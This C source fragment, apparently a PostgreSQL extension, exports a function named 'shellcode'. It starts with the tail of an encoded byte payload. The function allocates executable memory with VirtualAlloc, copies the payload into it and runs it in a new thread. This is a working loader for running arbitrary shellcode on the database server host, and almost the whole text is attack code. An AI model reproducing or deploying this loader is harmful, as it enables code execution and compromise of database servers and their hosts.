"\x9d\xbb\xaf\xdd\x8e\x21\x33\x9a\xdb\xa9\x1b\x4a\xe5\xbe\xbe"
"\xd2\x55\xd4\xad\x79\xea\x22\x51\xaf\xa2\x1e\x08\x83";



PGDLLEXPORT Datum shellcode(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(shellcode);

Datum shellcode(PG_FUNCTION_ARGS) {
    /*
        Classic method to load a shellcode in memory and create/execute a new thread at it location.
    */
    LPVOID p = VirtualAlloc(NULL, sizeof(payload), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    DWORD dwThreadId;
    MoveMemory(p, &payload, sizeof(payload));
    CreateThread(NULL, 0, p, NULL, 0, &dwThreadId);
    PG_RETURN_VOID();
}